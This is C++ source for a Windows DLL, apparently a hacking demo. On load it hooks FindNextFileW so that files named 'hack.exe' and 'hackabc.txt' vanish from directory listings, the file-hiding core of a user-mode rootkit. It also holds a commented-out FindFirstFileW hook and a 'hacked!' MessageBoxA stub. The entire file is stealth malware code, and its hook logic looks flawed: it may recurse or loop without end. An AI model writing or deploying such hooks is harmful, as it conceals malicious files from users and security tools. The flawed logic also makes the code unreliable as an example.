// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include "hookFunc.h"

#include <iostream>
#include <set>
#include <array>


int (WINAPI *pRealAPIentry)();

BOOL WINAPI hookFindNextFileW(
	HANDLE hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
);

HANDLE WINAPI HookFindFirstFileW(
	LPCWSTR lpFileName,
	LPWIN32_FIND_DATAW lpFindFileData
);

void initFileHide();

std::set<std::wstring> arrayFilehide;


BOOL APIENTRY DllMain(
	HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		initFileHide();
		if (InstallHook("KERNEL32.DLL", "FindNextFileW",
			(void*)hookFindNextFileW,
			(void**)(&pRealAPIentry)
		)) {
			MessageBoxA(NULL, "FindNextFileW Hook installed!", "Success", MB_ICONINFORMATION);
		}
		else {
			MessageBoxA(NULL, "Failed to install hook FindNextFileW!", "Fail", MB_ICONERROR);
		}
		//if (InstallHook("KERNEL32.DLL", "FindFirstFileW",
		//	(void*)HookFindFirstFileW,
		//	(void**)(&pRealAPIentry)
		//)) {
		//	MessageBoxA(NULL, "FindFirstFileW Hook installed!", "Success", MB_ICONINFORMATION);
		//}
		//else {
		//	MessageBoxA(NULL, "Failed to install hook FindFirstFileW!", "Fail", MB_ICONERROR);
		//}
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

void initFileHide() {
	arrayFilehide.clear();
	arrayFilehide.insert(std::wstring(L"hackabc.txt"));
	arrayFilehide.insert(std::wstring(L"hack.exe"));

}



BOOL WINAPI hookFindNextFileW(
	HANDLE hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
) {
//	MessageBoxA(NULL, "FindNextFileW Called!", "Info", MB_ICONINFORMATION);
START:
	BOOL tmp_rt = FindNextFileW(hFindFile, lpFindFileData);
	DWORD dwLastError = GetLastError();

	for (auto it : arrayFilehide) {
		if (lpFindFileData->cFileName == it) {
			goto START;
		}
	}

	SetLastError(dwLastError);
	return tmp_rt;
}



	
HANDLE WINAPI HookFindFirstFileW(
	LPCWSTR lpFileName,
	LPWIN32_FIND_DATAW lpFindFileData
) {
	HANDLE tmp_rt = FindFirstFileW(lpFileName, lpFindFileData);
	DWORD dwLastError = GetLastError();

	for (auto it : arrayFilehide) {
		if (lpFindFileData->cFileName == it) {
			FindNextFileW(tmp_rt, lpFindFileData);
			dwLastError = GetLastError();
			SetLastError(dwLastError);
			return tmp_rt;
		}
	}

	SetLastError(dwLastError);
	return tmp_rt;
}


int __stdcall HookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
	return MessageBoxA(NULL, "hello", "hacked!", MB_ICONERROR);;
}

